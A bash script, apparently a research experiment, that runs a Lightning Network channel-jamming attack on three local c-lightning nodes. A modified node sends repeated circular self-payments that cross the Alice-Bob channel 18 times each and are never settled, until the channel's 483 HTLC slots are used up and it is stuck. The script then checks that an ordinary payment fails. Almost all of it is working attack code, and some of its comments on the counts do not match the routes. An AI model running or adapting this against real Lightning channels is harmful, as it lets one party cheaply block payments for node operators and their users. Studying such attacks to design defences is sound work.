#!/bin/bash

# actors: Alice, Bob, Crol
# channels: Crol->Alice<--9-->Bob<--9-->Alice->Crol
# Use case: A route from Crol to Alice, back and forth Alice<->Bob 9 times and back to Crol.
# We repeat this payment to obtain max_htlc in Alice<->Bob channel. We need only 27 payments to block this channel.
# Change in c-lightning code: Crol does not return secret (invoice.c), before timeout Crol sends update_fail_htlc (peer_htlcs.c).

HOME='/home/ayelet'
. $HOME/.lightning/scripts/logger.sh

log_file="$HOME/.lightning/logs/exp9_multiple_back_forth_max_htlc_attack_$(date +'%d-%m-%Y-%H:%M:%S').log"

Alice_port=27592
Bob_port=27593
Crol_port=27594
amount_to_insert_lwallet=6
amount_to_insert_channel=16777215
payment_amount=100

. $HOME/.lightning/scripts/functions.sh -G $log_file

$HOME/.lightning/scripts/start_nodes.sh -G $log_file


create_channel Crol Alice $Alice_port $amount_to_insert_lwallet $amount_to_insert_channel
withdraw_remaining_amount Crol

create_channel Alice Bob $Bob_port $amount_to_insert_lwallet $amount_to_insert_channel
withdraw_remaining_amount Alice


alice_id=''
get_node_id Alice alice_id
bob_id=''
get_node_id Bob bob_id
crol_id=''
get_node_id Crol crol_id
sleep 2s

edebug "number of blocks: $(bitcoin-cli -datadir=$HOME/.bitcoin/Network getblockcount)" |& tee -a $log_file

print_channel_balances Crol Alice
print_channel_balances Alice Bob

#### Phase 1: Crol pays Bob #####

einfo "\n####### Phase 1: Crol pays Bob #######" |& tee -a $log_file

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Bob/lightning-rpc invoice 2000000000 "Crol_to_Bob-$(date +'%T:%N')" "$(date +'%T:%N') tx of 200000000 msat from Crol to Bob")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc pay $bolt11

print_channel_balances Crol Alice
print_channel_balances Alice Bob


#### Phase 2: Crol pays herself #####

einfo "\n####### Phase 2: Crol transfers money to herself through the lightning channel in a circular route #######" |& tee -a $log_file

for iteration in {1..26}
do

	edebug "\npayment iteration $iteration" |& tee -a $log_file

	inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "a-$(date +'%T:%N') $iteration" "$(date +'%T:%N') tx of $payment_amount msat a $iteration")

	einfo "$inv" |& tee -a $log_file

	payment_hash=$(jq '.payment_hash' <<< "$inv")

	route="[
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"105x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+19)),
	    \"amount_msat\" : \"$((payment_amount+19))msat\",
	    \"delay\" : 150
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+18)),
	    \"amount_msat\" : \"$((payment_amount+18))msat\",
	    \"delay\" : 117
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+17)),
	    \"amount_msat\" : \"$((payment_amount+17))msat\",
	    \"delay\" : 111
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+16)),
	    \"amount_msat\" : \"$((payment_amount+16))msat\",
	    \"delay\" : 105
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+15)),
	    \"amount_msat\" : \"$((payment_amount+15))msat\",
	    \"delay\" : 99
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+14)),
	    \"amount_msat\" : \"$((payment_amount+14))msat\",
	    \"delay\" : 93
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+13)),
	    \"amount_msat\" : \"$((payment_amount+13))msat\",
	    \"delay\" : 87
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+12)),
	    \"amount_msat\" : \"$((payment_amount+12))msat\",
	    \"delay\" : 81
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+11)),
	    \"amount_msat\" : \"$((payment_amount+11))msat\",
	    \"delay\" : 75
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+10)),
	    \"amount_msat\" : \"$((payment_amount+10))msat\",
	    \"delay\" : 69
	 },
	 {
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+9)),
	    \"amount_msat\" : \"$((payment_amount+9))msat\",
	    \"delay\" : 63
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+8)),
	    \"amount_msat\" : \"$((payment_amount+8))msat\",
	    \"delay\" : 57
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+7)),
	    \"amount_msat\" : \"$((payment_amount+7))msat\",
	    \"delay\" : 51
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+6)),
	    \"amount_msat\" : \"$((payment_amount+6))msat\",
	    \"delay\" : 45
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+5)),
	    \"amount_msat\" : \"$((payment_amount+5))msat\",
	    \"delay\" : 39
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+4)),
	    \"amount_msat\" : \"$((payment_amount+4))msat\",
	    \"delay\" : 33
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+3)),
	    \"amount_msat\" : \"$((payment_amount+3))msat\",
	    \"delay\" : 27
	 },
	{
	    \"id\" : \"$bob_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+2)),
	    \"amount_msat\" : \"$((payment_amount+2))msat\",
	    \"delay\" : 21
	 },
	{
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"113x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+1)),
	    \"amount_msat\" : \"$((payment_amount+1))msat\",
	    \"delay\" : 15
	 },
	{
	    \"id\" : \"$crol_id\",
	    \"channel\" : \"105x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $payment_amount,
	    \"amount_msat\" : \"${payment_amount}msat\",
	    \"delay\" : 9
	 }
	]"


	$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc sendpay "$route" $payment_hash  &

	$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc waitsendpay $payment_hash
sleep 4s

done

# Now channel Alice-Bob has 26*18=468
# we add 14 more

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "a-$(date +'%T:%N') $iteration" "$(date +'%T:%N') tx of $payment_amount msat a $iteration")

einfo "$inv" |& tee -a $log_file

payment_hash=$(jq '.payment_hash' <<< "$inv")

route="[
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+15)),
    \"amount_msat\" : \"$((payment_amount+15))msat\",
    \"delay\" : 99
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+14)),
    \"amount_msat\" : \"$((payment_amount+14))msat\",
    \"delay\" : 93
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+13)),
    \"amount_msat\" : \"$((payment_amount+13))msat\",
    \"delay\" : 87
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+12)),
    \"amount_msat\" : \"$((payment_amount+12))msat\",
    \"delay\" : 81
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+11)),
    \"amount_msat\" : \"$((payment_amount+11))msat\",
    \"delay\" : 75
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+10)),
    \"amount_msat\" : \"$((payment_amount+10))msat\",
    \"delay\" : 69
 },
 {
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+9)),
    \"amount_msat\" : \"$((payment_amount+9))msat\",
    \"delay\" : 63
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+8)),
    \"amount_msat\" : \"$((payment_amount+8))msat\",
    \"delay\" : 57
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+7)),
    \"amount_msat\" : \"$((payment_amount+7))msat\",
    \"delay\" : 51
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+6)),
    \"amount_msat\" : \"$((payment_amount+6))msat\",
    \"delay\" : 45
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+5)),
    \"amount_msat\" : \"$((payment_amount+5))msat\",
    \"delay\" : 39
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+4)),
    \"amount_msat\" : \"$((payment_amount+4))msat\",
    \"delay\" : 33
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+3)),
    \"amount_msat\" : \"$((payment_amount+3))msat\",
    \"delay\" : 27
 },
{
    \"id\" : \"$bob_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+2)),
    \"amount_msat\" : \"$((payment_amount+2))msat\",
    \"delay\" : 21
 },
{
    \"id\" : \"$alice_id\",
    \"channel\" : \"113x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $((payment_amount+1)),
    \"amount_msat\" : \"$((payment_amount+1))msat\",
    \"delay\" : 15
 },
{
    \"id\" : \"$crol_id\",
    \"channel\" : \"105x1x0\",
    \"direction\" : 0,
    \"msatoshi\" : $payment_amount,
    \"amount_msat\" : \"${payment_amount}msat\",
    \"delay\" : 9
 }
]"


$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc sendpay "$route" $payment_hash  &

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc waitsendpay $payment_hash
sleep 4s

# Now channel Alice-Bob has 26*18 + 14 = 482
# we add one more

einfo "\n#######  Bob pays Crol #######" |& tee -a $log_file

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "Bob_to_Crol-$(date +'%T:%N')" "$(date +'%T:%N') tx of $payment_amount msat from Bob to Crol")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Bob/lightning-rpc pay $bolt11 &

sleep 4s

print_channel_balances Crol Alice
print_channel_balances Alice Bob

# Now channel Alice-Bob has 26*18 + 14 + 1 = 483 is stuck

# test stuck:

einfo "\n#######  Test Bob pays Crol when channel is stuck #######" |& tee -a $log_file

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "Bob_to_Crol-$(date +'%T:%N')" "$(date +'%T:%N') tx of $payment_amount msat from Bob to Crol")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Bob/lightning-rpc pay $bolt11 &

sleep 4s

print_channel_balances Crol Alice
print_channel_balances Alice Bob

